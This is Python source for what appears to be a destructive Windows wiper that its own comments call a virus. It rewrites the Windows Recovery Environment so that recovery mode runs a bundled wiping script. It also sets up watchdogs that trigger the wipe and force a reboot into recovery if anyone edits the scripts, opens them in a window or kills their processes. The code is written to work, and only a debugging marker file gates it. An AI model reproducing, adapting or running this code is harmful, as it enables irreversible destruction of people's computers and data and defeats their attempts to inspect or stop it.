import sys
import psutil
import os
import time
import shutil
import hashlib
import win32gui

data = os.path.join(sys._MEIPASS, "data")

def get_hashes(files): # misc to get hashes of files
    hashes = []
    for file in files:
        with open(file, 'rb') as f:
            hash = hashlib.file_digest(f, 'sha256')
            hashes.append(hash.hexdigest())
    return hashes

def og_hashes(file_loc, date): # a function that is meant to get the original hashes of the scripts from a specified file. It knows if the hashes in the original file has been messed with because the file's last modified date is set to a specific arbitrary date and if it has been modified the date will also be changed.
    last_date = os.path.getmtime(file_loc) # get the last modified date of the file
    if date != last_date: # check if the last modified date is not the same as the date set by the virus
        destroy()

    with open(file_loc, 'r') as f:
        original_hashes = f.readlines() # get the hashes in an array
        f.close()
    return original_hashes

def check_hashes(script_list, original_hashes): # method that checks that the script files' hashes are intact (that they haven't been changed)
    while True: # always keep on checking
        for script in script_list: # go through all the scripts
            with open(script, 'rb') as f: # open the script to be able to access its content
                hash = hashlib.file_digest(f, 'sha256').hexdigest() # get the sha256 hash of the file
                if hash not in original_hashes: # check if the hash is not one of the original hashes (if one has been changed)
                    destroy()
                f.close() # close to save memory

def window_enumeration_handler(hwnd, results_list):
    # Check if the window is visible to get rid of useless windows
    if win32gui.IsWindowVisible(hwnd):
        results_list.append((hwnd, win32gui.GetWindowText(hwnd)))
    return True # Continue enumeration

def check_windows(script_list): # method that checks for any of the script names in window titles
    while True: # always keep on checking
        window_list = [] # List to store window handles and titles
        win32gui.EnumWindows(window_enumeration_handler, window_list) # Enumerate through all the windows
        for window in window_list:
            for script in script_list: # check all scripts
                if os.path.basename(script) in window[1]: # check if the name of the script is in a window. For example, if someone opened the script in a text editor that displays the name of the file being edited in the window name.
                    destroy()

def check_pids(pids): # checks that all of the pids of the scripts exist (therefore that none of the scripts have been closed)
    while True: # always keep on checking
        for pid in pids: # go through all the pids
            if not psutil.pid_exists(pid): # check if any pid is missing
                destroy()

def check_already_triggered(): # check if one of the checks was already triggered (in case recovery mode was exited during destruction process)
    if os.path.exists('C:/Windows/System32/destroy.trigger'):
        destroy()

def checker(script_list, original_hashes, pids): # perform all check every X time
    check_hashes(script_list, original_hashes)
    check_windows(script_list)
    check_pids(pids)
    check_already_triggered()

def setup_destroy_mechanism(): # modifies WinRE for immediate destruction. After this runs, if windows recovery runs the computer will be wiped, even if ran by the user. This dooms the computer.
    if not os.path.exists('C:/Windows/System32/Destroy me.please'): # for safety reasons, so no data is lost while debugging.
        with open("C:/debugging.txt", 'w') as f:
            f.write('no C:/Windows/System32/Destroy me.please')
            f.close()
        sys.exit()
    with open("C:/debugging.txt", 'a') as f:
        os.system("reagentc /disable") # disable windows recovery environment to be able to modify its files
        f.write('disable')
        os.system("attrib -h -s -r C:\Windows\System32\Recovery\winre.wim") # remove attributes from the windows recovery environment file that cause problems when interacting with it
        f.write('attrib')
        os.system("copy C:\Windows\System32\Recovery\winre.wim C:\Windows\WSF\winre.wim") # copy winre.wim to a folder where it can be modified freely because System32/recovery is a sensetive folder that can cause problems
        f.write('first copy')
        os.system("mkdir C:\Windows\RSLogs") # make a folder to mount winre.wim so its files can be modified
        f.write('mkdir')
        os.system("dism /mount-wim /wimfile:C:\Windows\WSF\winre.wim /index:1 /mountdir:C:\Windows\RSLogs") # mount winre.wim in the folder
        f.write('dism mount')
        os.system("takeown /f C:\Windows\RSLogs /r /d y") # take ownership of the files. Denies access otherwise
        f.write('takeown')
        os.system("icacls C:\mount\Windows\System32 /grant administrators:F /t") # set administrators as the owner of the files to avoid problems
        f.write('icacls')
        os.system("echo [LaunchApps] > C:\Windows\RSLogs\Windows\System32\winpeshl.ini") # winpeshl.ini is the file that tells the system what to do when windows recovery environment launches. We're overwriting it to do other things. [Launchapps] tell winpeshl.ini that we want it to launch something
        f.write('winpeshl p1')
        os.system("echo X:\System32\WinSE.cmd >> C:\Windows\RSLogs\Windows\System32\winpeshl.ini") # tells the system to run the wiping script
        f.write('winpeshl p2')
        f.close()
    shutil.copy(f'{data}\\WinSE.cmd', 'C:\Windows\RSLogs\Windows\System32\WinSE.cmd')
    with open("C:/debugging.txt", 'a') as f:
        f.write('wrote destruction script')
        os.system("dism /unmount-wim /mountdir:C:\Windows\RSLogs /commit") # repack the modified recovery environment
        f.write('dism commit')
        os.system("xcopy C:\Windows\WSF\winre.wim C:\Windows\System32\Recovery /h /y") # copy the modified recovery environment to its original location
        f.write('copy2')
        os.system("reagentc /enable") # reenable the modified recovery environment
        f.write('reagentc enable')
        f.close()

def destroy():
    if not os.path.exists('C:/Windows/System32/Destroy me.please'): # for safety reasons, so no data is lost while debugging.
        sys.exit()
    else:
        with open("C:/Windows/System32/destroy.trigger", 'w') as f:
            f.close()
        os.system("reagentc /boottore && shutdown /r /f /t 0") # restart into recovery mode to start wiping

if __name__ == '__main__': # run if being run as a standalone script and not as a library
    if not os.path.exists('C:/Windows/System32/Destroy me.please'): # for safety reasons, so no data is lost while debugging.
        sys.exit()
    setup_destroy_mechanism()
    destroy()